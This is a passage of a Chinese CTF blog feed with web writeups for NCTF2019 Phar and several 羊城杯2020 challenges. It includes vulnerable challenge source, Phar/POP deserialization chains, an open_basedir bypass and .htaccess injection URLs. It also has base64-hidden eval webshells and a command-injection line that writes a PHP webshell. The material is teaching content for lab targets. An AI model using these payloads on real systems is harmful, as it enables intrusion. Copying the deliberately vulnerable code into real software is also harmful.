class="string">&quot;Sorry, your file was not uploaded.&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">&quot;fileToUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], $target_file)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;The file <span class="subst">$file_name</span>  has been uploaded to ./uploads/&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, there was an error uploading your file.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>单独看这个upload.php使用了白名单限制，只能上传图片后缀的文件，应该要结合其他的功能点一起利用。</p><p>再看catchmime.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">funny_get</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">        $ch = curl_init();  </span><br><span class="line">        curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">        curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="literal">true</span>);</span><br><span class="line">        $output=curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this_is_a_easy_test=unserialize($_GET[<span class="string">&#x27;careful&#x27;</span>]);</span><br><span class="line">        <span class="keyword">if</span>($this_is_a_easy_test-&gt;funny_get() === <span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;curl(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&quot;submit&quot;</span>])) &#123;</span><br><span class="line">    $check = getimagesize($_POST[<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>($check !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is an image - &quot;</span> . $check[<span class="string">&quot;mime&quot;</span>] . <span class="string">&quot;.&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;File is not an image.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个文件中存在两个和功能不相干的类<code>Main</code>和<code>Easytest</code>。</p><p><code>getimagesize</code>会触发Phar反序列化，然后在<code>careful</code>参数触发<code>Easy_test</code>类的反序列化，修改test参数为1。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Easytest</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $test = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Main</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $url = <span class="string">&#x27;file:///etc/passwd&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Easytest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Main();</span><br><span class="line">ini_set(<span class="string">&#x27;phar.readonly&#x27;</span>,<span class="string">&#x27;Off&#x27;</span>);</span><br><span class="line"><span class="comment">### POP链构造</span></span><br><span class="line">@unlink(<span class="string">&quot;phar1.phar&quot;</span>);<span class="comment">//unlink() 函数删除文件。</span></span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();<span class="comment">//开始缓冲Phar写操作</span></span><br><span class="line">$phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;setMetadata($b);<span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);<span class="comment">//以字符串的形式添加一个文件到phar档案添 加要压缩的文件 //签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>然后payload打过去</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119191059.png" alt=""></p><p>读了一圈文件，没找到flag，又不能执行命令，尝试去读<code>/etc/hosts</code>（或者<code>/etc/net/arp</code>)</p><p>读到了一个内网IP地址<code>10.247.100.9</code>。结果BUU上面我试了好几个C段地址之后，<code>10.247.100.11</code>这个地址终于返回了PHP-FPM。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211543.png" alt=""></p><p>接着就用SSRF打FPM，网上都是用P牛的脚本去构造，</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119211947.png" alt=""></p><p>有open_basedir限制，绕过一下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php mkdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);chdir(&#39;&#x2F;tmp&#x2F;fuck&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);print_r(scandir(&#39;&#x2F;&#39;));readfile(&#39;&#x2F;flag&#39;);?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201119215144.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;NCTF2019-Phar-matches-everything&quot;&gt;NCTF2019 Phar matches everything&lt;/h1&gt;
&lt;p&gt;去年NCTF2019的题目，可以说是考到了PHP大部分的知识点，值得一做。&lt;/p&gt;
&lt;p&gt;原题目提示是通过vim的
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://ca0y1h.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>羊城杯2020-Web-Writeups</title>
    <link href="http://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/"/>
    <id>http://ca0y1h.top/Web_security/ctf_writeup/28.%E7%BE%8A%E5%9F%8E%E6%9D%AF2020-Web-Writeups/</id>
    <published>2020-12-10T14:53:59.000Z</published>
    <updated>2020-12-10T14:55:48.544Z</updated>
    
    <content type="html"><![CDATA[<h1 id="羊城杯2020-Web-Writeup">羊城杯2020 Web Writeup</h1><p>当时没时间打，现在题目在GitHub上开源了，随便看看。</p><h2 id="easycon">easycon</h2><p>蚁剑连接一句话，下载bbbbbbbbb.txt文件，是一个少了头部分的base64编码的图片，加上头再转码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163136.png" alt=""></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201208163156.png" alt=""></p><h2 id="easyser">easyser</h2><p>这题目说实在的，提示地太隐晦了，用不安全的协议读取ser.php文件，Fuzz半天发现是用<code>http://127.0.0.1/star1.php</code>读取源码。</p><p>ser.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br><span class="line">$flag=<span class="string">&#x27;&#123;Trump_:&quot;fake_news!&quot;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;hero = <span class="keyword">new</span> Yasuo;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;hero))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;hero-&gt;hasaki();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;You don&#x27;t look very happy&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $text;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$file=<span class="string">&#x27;&#x27;</span>,$text=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; file = $file;</span><br><span class="line">        <span class="keyword">$this</span> -&gt; text = $text;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $d   = <span class="string">&#x27;&lt;?php die(&quot;nononon&quot;);?&gt;&#x27;</span>;</span><br><span class="line">        $a= $d. <span class="keyword">$this</span>-&gt;text;</span><br><span class="line">        @file_put_contents(<span class="keyword">$this</span>-&gt; file,$a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yasuo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasaki</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;I&#x27;m the best happy windy man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$c=$_GET[&#x27;c&#x27;];</span></span><br><span class="line"><span class="comment">echo $x=unserialize($c);*/</span></span><br></pre></td></tr></table></figure><p>POP链构造+绕过exit</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GWHT</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $hero;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file = <span class="string">&quot;php://filter/convert.base64-decode/resource=aaa.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $text = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1Rbc10pOyAgPz4=&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> GWHT;</span><br><span class="line">$a-&gt;hero = <span class="keyword">new</span> Yongen;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><h2 id="easyphp">easyphp</h2><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;content&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">&#x27;on&#x27;</span>) || stristr($content,<span class="string">&#x27;html&#x27;</span>) || stristr($content,<span class="string">&#x27;type&#x27;</span>) || stristr($content,<span class="string">&#x27;flag&#x27;</span>) || stristr($content,<span class="string">&#x27;upload&#x27;</span>) || stristr($content,<span class="string">&#x27;file&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[^a-z\.]/&quot;</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Hacker&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">&quot;\nHello, world&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一反应就是覆盖掉index.php，但是好像没有写入权限，那大概率应该就是用<code>.htaccess</code>这个文件做文章了。</p><p>第一种思路，向<code>.htaccess</code>文件写入shell，并且用auto_prepend_file包含<code>.htaccess</code>，但是<code>file</code>关键字被ban了，可以用换行绕过，结尾要用<code>\</code>处理content中的<code>\n</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;.htaccess&amp;content&#x3D;php_value%20auto_prepend_fil\%0ae%20.htaccess%0a%23&lt;? php%20system(&#39;cat%20&#x2F;fl[a]g&#39;);?&gt;\</span><br></pre></td></tr></table></figure><p>第二种思路，依然是利用<code>.htaccess</code>文件特性，不过这次是通过设置php_value来设置<code>preg_macth</code>正则回溯次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit 0</span><br><span class="line">php_value pcre.jit 0</span><br></pre></td></tr></table></figure><p>先写入<code>.htaccess</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content&#x3D;php_value%20pcre.backtrack_limit%200%0aphp_value%20pcre.jit%200%0a%23\&amp;f ilename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>再直接通过<code>php://filter</code>伪协议写入一句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;.htaccess&amp;content&#x3D;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0IDAKcG hwX3ZhbHVlIHBjcmUuaml0IDAKcGhwX3ZhbHVlIGF1dG9fYXBwZW5kX2ZpbGUgLmh0YWNjZXNzCiM8P3 BocCBldmFsKCRfR0VUWzFdKTs&#x2F;Plw&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h2 id="easyphp2">easyphp2</h2><p>robots.txt提示有check.php</p><p>伪协议读取源码：</p><blockquote><p><a href="https://www.php.net/manual/zh/filters.convert.php">https://www.php.net/manual/zh/filters.convert.php</a></p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8080&#x2F;?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;GWHT.php</span><br></pre></td></tr></table></figure><p>GWHT.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;count is here&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        html,</span><br><span class="line">        body &#123;</span><br><span class="line">            overflow: none;</span><br><span class="line">            max-height: <span class="number">100</span>vh;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body style=<span class="string">&quot;height: 100vh; text-align: center; background-color: green; color: blue; display: flex; flex-direction: column; justify-content: center;&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">&lt;center&gt;&lt;img src=<span class="string">&quot;question.jpg&quot;</span> height=<span class="string">&quot;200&quot;</span> width=<span class="string">&quot;200&quot;</span> /&gt; &lt;/center&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">&#x27;pass&#x27;</span>] !== getenv(<span class="string">&#x27;PASS&#x27;</span>)) &#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;PASS&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;hacker&gt;&#x27;</span>.<span class="string">&#x27;&lt;h2&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;404&#x27;</span>.<span class="string">&#x27;&lt;h1&gt;&#x27;</span>.<span class="string">&#x27;&lt;br&gt;&#x27;</span>.<span class="string">&#x27;Sorry, only people from GWHT are allowed to access this website.&#x27;</span>.<span class="string">&#x27;23333&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h1&gt;A Counter is here, but it has someting wrong&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;form&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;hidden&quot;</span> value=<span class="string">&quot;GWHT.php&quot;</span> name=<span class="string">&quot;file&quot;</span>&gt;</span><br><span class="line">        &lt;textarea style=<span class="string">&quot;border-radius: 1rem;&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;count&quot;</span> rows=<span class="number">10</span> cols=<span class="number">50</span>&gt;&lt;/textarea&gt;&lt;br /&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&quot;count&quot;</span>])) &#123;</span><br><span class="line">        $count = $_GET[<span class="string">&quot;count&quot;</span>];</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/;|base64|rot13|base32|base16|&lt;\?php|#/i&#x27;</span>, $count))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;The Count is: &quot;</span> . exec(<span class="string">&#x27;printf \&#x27;&#x27;</span> . $count . <span class="string">&#x27;\&#x27; | wc -c&#x27;</span>) . <span class="string">&quot;&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>check.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pass = <span class="string">&quot;GWHT&quot;</span>;</span><br><span class="line"><span class="comment">// Cookie password.</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Here is nothing, isn&#x27;t it ?&quot;</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br></pre></td></tr></table></figure><p>读到Cookie是GWHT，接下来就是命令执行<code>exec('printf \'' . $count . '\' | wc -c')</code></p><p>exec命令无回显，可以直接写入shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39;| echo &quot;&lt;?&#x3D;eval(\$_POST[&#39;shell&#39;])?&gt;&quot; &gt; shell.php ||&#39;</span><br></pre></td></tr></table></figure><p>另外base64还有一种绕过方式：<code>%6%32</code>，<code>%32</code>是2，拼接成<code>%62</code>就是字母<code>b</code>了。</p><h2 id="BlackCat">BlackCat</h2><p>首页提示你听歌，把MP3下载到本地，用010 Editor打开，文件末尾隐藏着PHP代码</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201210224100.png" alt=""></p><p>copy下来放到sublime中审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_POST[<span class="string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="keyword">empty</span>($_POST[<span 